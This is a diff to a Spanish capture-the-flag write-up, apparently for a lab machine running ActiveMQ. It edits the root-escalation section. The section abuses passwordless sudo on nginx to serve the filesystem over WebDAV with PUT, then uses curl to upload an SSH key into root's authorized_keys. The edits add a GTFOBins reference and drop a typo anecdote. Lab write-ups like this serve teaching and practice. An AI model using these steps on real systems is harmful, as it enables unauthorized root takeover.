@@ -97,6 +97,8 @@ export TERM=xterm-256color
 export SHELL=bash
 ```
 
+Ya en el directorio de instalación (`/opt/apache-activemq-5.15.15/bin`) revisé el archivo `env` por si tenía alguna credencial o dato útil embebido; solo contiene configuración estándar de arranque (memoria de la JVM, rutas de JMX comentadas, etc.), nada aprovechable.
+
 Flag de usuario en `/home/activemq/user.txt`.
 
 ## Escalada a root
@@ -110,7 +112,7 @@ User activemq may run the following commands on broker:
     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
 ```
 
-`activemq` puede lanzar `nginx` como root sin contraseña, con la ruta de configuración libre. Escribí una configuración maliciosa que sirve todo el sistema de archivos por WebDAV con el método PUT habilitado:
+`activemq` puede lanzar `nginx` como root sin contraseña, con la ruta de configuración libre. Consulté GTFOBins para la entrada de `nginx` en `sudo`: la técnica es levantar una instancia con una configuración propia que sirva todo el sistema de archivos por WebDAV con el método PUT habilitado, para poder escribir como root. Escribí esa configuración:
 
 ```
 cat << EOF > /tmp/nginx_pwn.conf
@@ -139,7 +141,7 @@ ssh-keygen
 # guardada como "root" / "root.pub"
 ```
 
-Al subir la clave pública tecleé mal el comando la primera vez (`cur` en vez de `curl`, "command not found"). Corregido, subí `root.pub` como `authorized_keys` de root vía PUT:
+Subí `root.pub` como `authorized_keys` de root vía PUT:
 
 ```
 curl -T root.pub http://localhost:1339/root/.ssh/authorized_keys
